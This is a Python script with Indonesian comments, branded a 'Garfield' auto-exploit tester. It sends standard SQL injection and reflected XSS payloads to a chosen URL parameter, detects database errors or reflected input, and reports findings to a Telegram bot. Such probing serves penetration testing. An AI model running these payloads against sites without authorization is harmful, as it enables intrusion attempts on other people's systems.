import os
import sys
import argparse
import requests
from dotenv import load_dotenv

# Load kredensial dari .env jika ingin mengirim notifikasi Telegram juga
load_dotenv()
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("OWNER_ID")

# Payload uji coba standar industri untuk pentest awal
PAYLOADS = {
    "SQLi": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "') OR ('1'='1"
    ],
    "XSS": [
        "<script>alert('XSS-Garfield')</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>"
    ]
}

def send_telegram_alert(vuln_type, target_url, param, payload):
    """Mengirim peringatan kerentanan via Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    msg = (
        f"🚨 <b>KERENTANAN DITEMUKAN!</b> 🚨\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 <b>Jenis:</b> <code>{vuln_type}</code>\n"
        f"🌐 <b>Target:</b> <code>{target_url}</code>\n"
        f"⚙️ <b>Parameter:</b> <code>{param}</code>\n"
        f"📦 <b>Payload:</b> <code>{payload}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}, timeout=5)

def test_vulnerability(target_url, param_name):
    print("=" * 50)
    print("⚡ GARFIELD AUTO-EXPLOIT TESTER v1.0")
    print(f"🎯 Target    : {target_url}")
    print(f"📋 Parameter : {param_name}")
    print("=" * 50 + "\n")

    vulnerable_findings = False

    # 1. Pengujian SQL Injection
    print("--- [ 1. Menguji Kerentanan SQL Injection (SQLi) ] ---")
    for payload in PAYLOADS["SQLi"]:
        data = {param_name: payload}
        try:
            response = requests.get(target_url, params=data, timeout=5)
            # Indikator error database umum
            sql_errors = ["sql syntax", "mysql", "syntax error", "unclosed quotation mark", "sqlite3"]
            
            if any(err in response.text.lower() for err in sql_errors):
                print(f"[!] [RENTAN SQLi] Payload: {payload}")
                send_telegram_alert("SQL Injection", target_url, param_name, payload)
                vulnerable_findings = True
                break
            else:
                print(f"[-] Aman: {payload}")
        except Exception as e:
            print(f"[X] Koneksi error: {e}")
            break

    print("\n--- [ 2. Menguji Kerentanan Cross-Site Scripting (XSS) ] ---")
    # 2. Pengujian Reflected XSS
    for payload in PAYLOADS["XSS"]:
        data = {param_name: payload}
        try:
            response = requests.get(target_url, params=data, timeout=5)
            # Indikator XSS: Payload mentah dikembalikan oleh server ke dalam HTML tanpa sanitasi
            if payload in response.text:
                print(f"[!] [RENTAN XSS] Payload terpantul: {payload}")
                send_telegram_alert("Cross-Site Scripting (XSS)", target_url, param_name, payload)
                vulnerable_findings = True
                break
            else:
                print(f"[-] Aman: {payload}")
        except Exception as e:
            print(f"[X] Koneksi error: {e}")
            break

    print("\n" + "=" * 50)
    if vulnerable_findings:
        print("[!] STATUS: Target memiliki celah keamanan (Alert dikirim ke Telegram).")
    else:
        print("[+] STATUS: Tidak ditemukan kerentanan dari payload dasar.")
    print("=" * 50)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Auto-Exploit Tester oleh Garfield Security")
    parser.add_argument("-u", "--url", required=True, help="URL target endpoint (cth: http://127.0.0.1:8080/dashboard)")
    parser.add_argument("-p", "--param", required=True, help="Nama parameter input (cth: search, user, id)")
    
    args = parser.parse_args()
    test_vulnerability(args.url, args.param)
